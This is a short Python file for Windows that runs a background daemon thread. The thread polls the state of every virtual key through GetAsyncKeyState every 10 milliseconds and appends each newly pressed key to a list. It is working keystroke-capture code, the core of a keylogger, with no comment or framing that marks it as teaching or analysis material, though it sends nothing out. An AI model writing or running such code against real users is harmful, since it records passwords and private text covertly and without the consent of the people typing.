import ctypes
import threading
import time

user32 = ctypes.windll.user32
captured = []


def capture_loop():
    prev = {}
    while True:
        for vk in range(0, 256):
            down = bool(user32.GetAsyncKeyState(vk) & 0x8000)
            if down and not prev.get(vk, False):
                captured.append(chr(vk))
            prev[vk] = down
        time.sleep(0.01)


threading.Thread(target=capture_loop, daemon=True).start()
